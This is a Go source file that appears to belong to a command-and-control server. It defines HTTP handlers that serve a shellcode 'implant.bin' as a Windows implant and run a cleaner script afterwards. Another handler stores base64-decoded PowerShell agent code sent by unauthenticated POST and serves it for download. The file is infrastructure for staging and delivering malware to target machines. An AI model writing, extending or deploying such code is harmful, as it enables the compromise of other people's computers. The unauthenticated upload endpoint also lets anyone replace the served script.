package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"bytes"
)

func windowsImplant(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Agent getting downloaded")
	filepath := "OutputShellcode/implant.bin"
	if _, err := os.Stat(filepath); os.IsNotExist(err) {
		fmt.Println("File does not exist:", err)
		http.Error(w, "File not found.", http.StatusNotFound)
		return
	}
	http.ServeFile(w, r, filepath)

	fmt.Println("Cleaning loader...")
	var cmd *exec.Cmd
	cmd = exec.Command("/bin/bash", "-c", "python3 Cleaner.py")
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err2 := cmd.Run()
	if err2 != nil {
		fmt.Println("Error:", err2)
		fmt.Println("Stderr:", stderr.String())
	}
}

func powerShellImplant(w http.ResponseWriter, r *http.Request) {
	filePath := "implants/windows/powershell/agent.ps1"

	if r.Method == http.MethodPost {
		var agent Agent
		err := json.NewDecoder(r.Body).Decode(&agent)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		decoded, err := base64.StdEncoding.DecodeString(agent.Code)
		if err != nil {
			http.Error(w, "Failed to decode base64 string", http.StatusBadRequest)
			return
		}
		agent.Code = string(decoded)
		err = ioutil.WriteFile(filePath, []byte(agent.Code), 0644)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	} else if r.Method == http.MethodGet {
		fmt.Println("Hit to download powershell script")
		http.ServeFile(w, r, filePath)
	} else {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
	}
}
